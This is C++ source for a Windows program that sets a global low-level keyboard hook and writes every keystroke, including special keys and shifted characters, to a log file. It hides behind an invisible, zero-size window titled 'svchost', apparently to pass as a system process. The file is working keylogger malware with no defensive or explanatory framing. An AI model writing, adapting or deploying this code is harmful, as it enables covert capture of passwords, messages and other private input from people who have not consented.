
#include "WinMain.h"

LRESULT CALLBACK WndProc(HWND, UINT, WPARAM, LPARAM);
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
Logger* logger = new Logger(LOG_FILE);

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInst, PSTR szCmdLine, int iCmdShow)

{
	HWND hwnd;
	MSG msg;
	WNDCLASSEX wndcls;

	const char g_szClassName[] = "michifu";

	wndcls.cbSize = sizeof(WNDCLASSEX);
	wndcls.style = CS_HREDRAW | CS_VREDRAW;
	wndcls.lpfnWndProc = WndProc;
	wndcls.cbClsExtra = 0;
	wndcls.cbWndExtra = 0;
	wndcls.hInstance = hInstance;
	wndcls.hIcon = LoadIcon(NULL, IDI_APPLICATION);
	wndcls.hCursor = LoadCursor(NULL, IDC_ARROW);
	wndcls.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
	wndcls.lpszClassName = g_szClassName;
	wndcls.lpszMenuName = NULL;
	wndcls.hIconSm = LoadIcon(NULL, IDI_APPLICATION);

	( !RegisterClassEx(&wndcls) ) ? logger->write("can not register window class!\n") : logger->write("windows class registered !\n");
	
	hwnd = CreateWindowEx(NULL,
		g_szClassName,
		"svchost",
		NULL,
		0, 0, 0, 0,
		NULL, NULL, hInstance, NULL);

	HHOOK hhkLowLevelKybd = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, 0, 0);
	(hhkLowLevelKybd != NULL) ? logger->write("hhkLowLevelKybd hooked !\n") : logger->write("hhkLowLevelKybd failed !\n");

	while (GetMessage(&msg, NULL, 0, 0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	UnhookWindowsHookEx(hhkLowLevelKybd);
	return msg.wParam;
}

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)lParam;
	int test;

	if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN))
	{
		switch (p->vkCode)
		{
		case VK_RSHIFT:
			break;
		case VK_SHIFT:
			break;
		case VK_LSHIFT:
			break;
		case VK_CAPITAL:
			break;
		case VK_NUMPAD0:
			logger->write("0");
			break;
		case VK_NUMPAD1:
			logger->write("1");
			break;
		case VK_NUMPAD2:
			logger->write("2");
			break;
		case VK_NUMPAD3:
			logger->write("3");
			break;
		case VK_NUMPAD4:
			logger->write("4");
			break;
		case VK_NUMPAD5:
			logger->write("5");
			break;
		case VK_NUMPAD6:
			logger->write("6");
			break;
		case VK_NUMPAD7:
			logger->write("7");
			break;
		case VK_NUMPAD8:
			logger->write("8");
			break;
		case VK_NUMPAD9:
			logger->write("9");
			break;
		case VK_ADD:
			logger->write("+");
			break;
		case VK_BACK:
			logger->write("[ DEL ]");//borra
			break;
		case VK_DECIMAL:
			logger->write(".");// .
			break;
		case VK_DIVIDE:
			logger->write("/");
			break;
		case VK_ESCAPE:
			logger->write("[ ESC ]");
			break;
		case VK_TAB:
			logger->write("\t");
			break;
		case VK_MULTIPLY:
			logger->write("*");// *
			break;
		case VK_OEM_1:
			logger->write("[ :; ]");//:; 
			break;
		case VK_OEM_102:
			logger->write("[ <> ]");//<> 
			break;
		case VK_OEM_2:
			logger->write("[ ?/ ]");// ?/ 
			break;
		case VK_OEM_3:
			logger->write("[ ~´ ]");//~`
			break;
		case VK_OEM_4:
			logger->write("[ {[ ]");//{[ 
			break;
		case VK_OEM_5:
			logger->write("[ |\\ ]");// |\ 
			break;
		case VK_OEM_6:
			logger->write("[ }] ]");//}]
			break;
		case VK_OEM_7:
			logger->write("[ \"' ]");// "'
			break;
		case VK_OEM_8:
			logger->write("[ $! ]");// §!
			break;
		case VK_OEM_COMMA:
			logger->write("[ <, ]");//<, 
			break;
		case VK_OEM_MINUS:
			logger->write("[ _- ]");// _- 
			break;
		case VK_OEM_PERIOD:
			logger->write("[ >. ]");// >. 
			break;
		case VK_OEM_PLUS:
			logger->write("[ += ]");// += 
			break;
		case VK_SPACE:
			logger->write(" ");
			break;
		case VK_RETURN:
			logger->write("\n");
			break;
		case VK_DOWN:
			logger->write("[ DOWN ]");
			break;
		case VK_UP:
			logger->write("[ UP ]");
			break;
		case VK_LEFT:
			logger->write("[ LEFT ]");
			break;
		case VK_RIGHT:
			logger->write("[ RIGHT ]");
			break;
		case VK_LCONTROL:
			logger->write("[ L_CONTROL ]");
			break;
		case VK_RCONTROL:
			logger->write("[ R_CONTROL ]");
			break;
		case VK_F1:
			logger->write("[ F1 ]");
			break;
		case VK_F2:
			logger->write("[ F2 ]");
			break;
		case VK_F3:
			logger->write("[ F3 ]");
			break;
		case VK_F4:
			logger->write("[ F4 ]");
			break;
		case VK_F5:
			logger->write("[ F5 ]");
			break;
		case VK_F6:
			logger->write("[ F6 ]");
			break;
		case VK_F7:
			logger->write("[ F7 ]");
			break;
		case VK_F8:
			logger->write("[ F8 ]");
			break;
		case VK_F9:
			logger->write("[ F9 ]");
			break;
		case VK_F10:
			logger->write("[ F10 ]");
			break;
		case VK_F11:
			logger->write("[ F11 ]");
			break;
		case VK_F12:
			logger->write("[ F12 ]");
			break;
		default:
			( GetKeyState(VK_SHIFT) < 0 || (GetKeyState(VK_CAPITAL) & 0x0001) != 0 ) ? logger->write(p->vkCode):logger->write( tolower(p->vkCode) );
			break;
		}
	}
	else if (nCode == HC_ACTION && (wParam == WM_KEYUP|| wParam == WM_SYSKEYUP)) {}
	else {}
	return(CallNextHookEx(NULL, nCode, wParam, lParam));
}


LRESULT CALLBACK WndProc(HWND hwnd, UINT iMsg, WPARAM wParam, LPARAM lParam)
{

	switch (iMsg)
	{
	case WM_DESTROY:
		logger->write("[ Closed ]\n");
		logger->~Logger();
		PostQuitMessage(0);
		return 0;
		break;
	default:
		return DefWindowProc(hwnd, iMsg, wParam, lParam);
	}
}